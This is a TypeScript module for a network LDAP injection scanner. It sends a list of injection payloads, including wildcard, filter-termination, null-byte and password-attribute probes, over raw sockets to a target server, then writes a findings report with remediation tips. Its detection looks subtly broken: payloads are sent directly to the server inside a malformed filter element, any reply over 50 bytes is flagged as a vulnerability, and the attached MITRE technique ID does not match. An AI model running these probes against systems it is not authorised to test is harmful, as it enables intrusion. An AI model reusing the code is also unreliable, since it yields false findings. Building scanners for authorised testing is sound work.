import { Socket } from "net";

export interface LdapProbeResult {
  target: string;
  port: number;
  scanStarted: Date;
  scanCompleted: Date;
  durationMs: number;
  accessible: boolean;
  vulnerabilities: LdapVulnerability[];
  serverInfo?: {
    vendor?: string;
    version?: string;
    namingContexts?: string[];
  };
}

export interface LdapVulnerability {
  type: string;
  payload: string;
  response: string;
  risk: "critical" | "high" | "medium" | "low";
  description: string;
  mitreId?: string;
}

const LDAP_INJECTION_PAYLOADS = [
  { payload: "*", description: "Wildcard injection - may return all entries", risk: "high" as const },
  { payload: "*)(&", description: "Filter termination injection", risk: "critical" as const },
  { payload: "*)(uid=*))(|(uid=*", description: "Boolean-based LDAP injection", risk: "critical" as const },
  { payload: "admin)(&)", description: "Filter bypass attempt", risk: "high" as const },
  { payload: "*)(objectClass=*", description: "Object class enumeration", risk: "medium" as const },
  { payload: "*))(|(password=*", description: "Password attribute exposure attempt", risk: "critical" as const },
  { payload: "*))%00", description: "Null byte injection", risk: "high" as const },
  { payload: "*)(cn=*", description: "Common name enumeration", risk: "medium" as const },
  { payload: "*)(mail=*", description: "Email enumeration", risk: "medium" as const },
  { payload: "*)(userPassword=*", description: "User password attribute access", risk: "critical" as const },
];

async function checkLdapPort(host: string, port: number, timeout: number = 5000): Promise<boolean> {
  return new Promise((resolve) => {
    const socket = new Socket();
    socket.setTimeout(timeout);
    
    socket.on("connect", () => {
      socket.destroy();
      resolve(true);
    });
    
    socket.on("timeout", () => {
      socket.destroy();
      resolve(false);
    });
    
    socket.on("error", () => {
      socket.destroy();
      resolve(false);
    });
    
    socket.connect(port, host);
  });
}

async function sendLdapRequest(
  host: string,
  port: number,
  searchFilter: string,
  baseDn: string = "dc=example,dc=com",
  timeout: number = 5000
): Promise<{ success: boolean; response: string; error?: string }> {
  return new Promise((resolve) => {
    const socket = new Socket();
    socket.setTimeout(timeout);
    let responseData = "";
    
    const bindRequest = buildSimpleLdapBindRequest();
    const searchRequest = buildSimpleLdapSearchRequest(baseDn, searchFilter);
    
    socket.on("connect", () => {
      socket.write(bindRequest);
    });
    
    socket.on("data", (data) => {
      responseData += data.toString("hex");
      
      if (responseData.length > 20) {
        socket.write(searchRequest);
      }
      
      if (responseData.length > 100) {
        socket.destroy();
        resolve({
          success: true,
          response: `Received ${responseData.length / 2} bytes of LDAP response`,
        });
      }
    });
    
    socket.on("timeout", () => {
      socket.destroy();
      if (responseData.length > 0) {
        resolve({
          success: true,
          response: `Partial response: ${responseData.length / 2} bytes`,
        });
      } else {
        resolve({ success: false, response: "Timeout", error: "Connection timeout" });
      }
    });
    
    socket.on("error", (err) => {
      socket.destroy();
      resolve({ success: false, response: "", error: err.message });
    });
    
    socket.connect(port, host);
  });
}

function buildSimpleLdapBindRequest(): Buffer {
  return Buffer.from([
    0x30, 0x0c,
    0x02, 0x01, 0x01,
    0x60, 0x07,
    0x02, 0x01, 0x03,
    0x04, 0x00,
    0x80, 0x00,
  ]);
}

function buildSimpleLdapSearchRequest(baseDn: string, filter: string): Buffer {
  const baseBytes = Buffer.from(baseDn, "utf8");
  const filterBytes = Buffer.from(`(cn=${filter})`, "utf8");
  
  const searchBody = Buffer.concat([
    Buffer.from([0x04]), Buffer.from([baseBytes.length]), baseBytes,
    Buffer.from([0x0a, 0x01, 0x02]),
    Buffer.from([0x0a, 0x01, 0x00]),
    Buffer.from([0x02, 0x01, 0x00]),
    Buffer.from([0x02, 0x01, 0x00]),
    Buffer.from([0x01, 0x01, 0x00]),
    Buffer.from([0x87]), Buffer.from([filterBytes.length]), filterBytes,
    Buffer.from([0x30, 0x00]),
  ]);
  
  const messageId = Buffer.from([0x02, 0x01, 0x02]);
  const searchOp = Buffer.concat([Buffer.from([0x63]), Buffer.from([searchBody.length]), searchBody]);
  const fullMessage = Buffer.concat([messageId, searchOp]);
  
  return Buffer.concat([
    Buffer.from([0x30]),
    Buffer.from([fullMessage.length]),
    fullMessage,
  ]);
}

export async function runLdapProbe(
  target: string,
  port: number = 389,
  baseDn?: string,
  testUser?: string,
  onProgress?: (phase: string, progress: number, message: string) => void
): Promise<LdapProbeResult> {
  const startTime = Date.now();
  const vulnerabilities: LdapVulnerability[] = [];
  
  onProgress?.("initialization", 0, `Starting LDAP probe against ${target}:${port}...`);
  
  const isAccessible = await checkLdapPort(target, port);
  
  if (!isAccessible) {
    return {
      target,
      port,
      scanStarted: new Date(startTime),
      scanCompleted: new Date(),
      durationMs: Date.now() - startTime,
      accessible: false,
      vulnerabilities: [],
    };
  }
  
  onProgress?.("scanning", 20, "LDAP port accessible, testing injection payloads...");
  
  const defaultBaseDn = baseDn || "dc=example,dc=com";
  const totalPayloads = LDAP_INJECTION_PAYLOADS.length;
  
  for (let i = 0; i < totalPayloads; i++) {
    const { payload, description, risk } = LDAP_INJECTION_PAYLOADS[i];
    
    onProgress?.("testing", Math.round(20 + (i / totalPayloads) * 70), 
      `Testing payload ${i + 1}/${totalPayloads}: ${description}`);
    
    const result = await sendLdapRequest(target, port, payload, defaultBaseDn);
    
    if (result.success && result.response.includes("bytes")) {
      const responseBytes = parseInt(result.response.match(/(\d+) bytes/)?.[1] || "0", 10);
      
      if (responseBytes > 50) {
        vulnerabilities.push({
          type: "ldap_injection",
          payload,
          response: result.response,
          risk,
          description,
          mitreId: "T1556.006",
        });
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 200));
  }
  
  onProgress?.("completed", 100, `LDAP probe complete. Found ${vulnerabilities.length} potential vulnerabilities.`);
  
  return {
    target,
    port,
    scanStarted: new Date(startTime),
    scanCompleted: new Date(),
    durationMs: Date.now() - startTime,
    accessible: true,
    vulnerabilities,
    serverInfo: {
      namingContexts: [defaultBaseDn],
    },
  };
}

export function generateLdapProbeReport(result: LdapProbeResult): string {
  const lines: string[] = [
    "# LDAP Injection Probe Report",
    "",
    `**Target:** ${result.target}:${result.port}`,
    `**Duration:** ${(result.durationMs / 1000).toFixed(1)}s`,
    `**LDAP Accessible:** ${result.accessible ? "Yes" : "No"}`,
    `**Vulnerabilities Found:** ${result.vulnerabilities.length}`,
    "",
  ];
  
  if (!result.accessible) {
    lines.push("## Result");
    lines.push("");
    lines.push("LDAP service is not accessible on the specified port.");
    return lines.join("\n");
  }
  
  if (result.vulnerabilities.length > 0) {
    lines.push("## Vulnerabilities Detected");
    lines.push("");
    
    for (const vuln of result.vulnerabilities) {
      lines.push(`### ${vuln.risk.toUpperCase()}: ${vuln.description}`);
      lines.push("");
      lines.push(`- **Payload:** \`${vuln.payload}\``);
      lines.push(`- **Response:** ${vuln.response}`);
      if (vuln.mitreId) {
        lines.push(`- **MITRE ATT&CK:** ${vuln.mitreId}`);
      }
      lines.push("");
    }
    
    lines.push("## Recommendations");
    lines.push("");
    lines.push("1. Sanitize and validate all user input before constructing LDAP queries");
    lines.push("2. Use parameterized LDAP queries where possible");
    lines.push("3. Implement input validation using allowlists");
    lines.push("4. Apply the principle of least privilege for LDAP bind accounts");
    lines.push("5. Enable LDAP logging and monitoring for suspicious queries");
  } else {
    lines.push("## No Vulnerabilities Detected");
    lines.push("");
    lines.push("No LDAP injection vulnerabilities were detected with the tested payloads.");
    lines.push("This does not guarantee the service is secure - additional manual testing is recommended.");
  }
  
  return lines.join("\n");
}
